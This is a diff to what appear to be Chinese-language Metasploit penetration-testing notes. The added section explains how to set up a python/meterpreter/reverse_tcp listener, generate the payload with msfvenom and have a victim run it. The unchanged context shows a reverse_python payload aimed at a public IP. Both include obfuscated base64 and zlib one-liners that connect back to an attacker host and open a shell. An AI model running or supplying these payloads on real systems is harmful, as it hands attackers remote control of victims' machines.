@@ -1202,6 +1202,7 @@ msf工具:
 搜索payload:
 msfvenom -l payloads | grep 'cmd/unix/reverse'
 
+（1）python版(没用)
 使用python版：cmd/unix/reverse_python生成payload:
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p cmd/unix/reverse_python lhost=175.24.115.4 lport=1234                  130 ⨯
@@ -1213,6 +1214,25 @@ python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('
 
 然后在害者机器执行生成的paylaod，如下:
 python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCwgICAgICAgc3VicHJvY2VzcywgICAgICAgb3MgICAgICAgICA7ICAgaG9zdD0iMTc1LjI0LjExNS40IiAgICAgICAgIDsgICBwb3J0PTEyMzQgICAgICAgICA7ICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICAgOyAgIHMuY29ubmVjdCgoaG9zdCwgICAgICAgcG9ydCkpICAgICAgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAgMCkgICAgICAgICA7ICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgICAxKSAgICAgICAgIDsgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgIDIpICAgICAgICAgOyAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
+
+（2）python版（python3，有用）
+msfconsole打开监听
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST 192.168.94.245
+set LPORT 1333
+run
+
+0x01生成payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.94.245 LPORT=1333 -f raw -o payload.py
+
+0x02生成的paylaod.py内容如下：
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMP2Y4u7WEHEg4gIrjcRadNRQ9OkZLJaFf+7G7p4meG9efPmw4yTD5Gi1wNE+W1NJ7sWoa4kxrDXUUYzAnn1gc7UOBpa9wY8X4ktyWL4OsQMm6VZLYkX8oh391e3L7vHh+vLO5F0SnvnQEfOWb4pVF6fqU2limrNZF6WpUiiLkA7kAxmDVNM7mm8Qgsw8bUgtlm2Uns3tXrg7OKGSVQB9AevhHhaPZO+OWIryOe7sUAtON6Lc3uw60/+q6cLLQjMoHk6XPWg/TgFQOTLD1RXV4nsISnlD0O2xV9B/gBwkF9r')[0])))
+
+0x03受害者执行（windows）：
+python3 payload.py
+或(命令行模式)
+python3 -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMP2Y4u7WEHEg4gIrjcRadNRQ9OkZLJaFf+7G7p4meG9efPmw4yTD5Gi1wNE+W1NJ7sWoa4kxrDXUUYzAnn1gc7UOBpa9wY8X4ktyWL4OsQMm6VZLYkX8oh391e3L7vHh+vLO5F0SnvnQEfOWb4pVF6fqU2limrNZF6WpUiiLkA7kAxmDVNM7mm8Qgsw8bUgtlm2Uns3tXrg7OKGSVQB9AevhHhaPZO+OWIryOe7sUAtON6Lc3uw60/+q6cLLQjMoHk6XPWg/TgFQOTLD1RXV4nsISnlD0O2xV9B/gBwkF9r')[0])))"
 
 
 
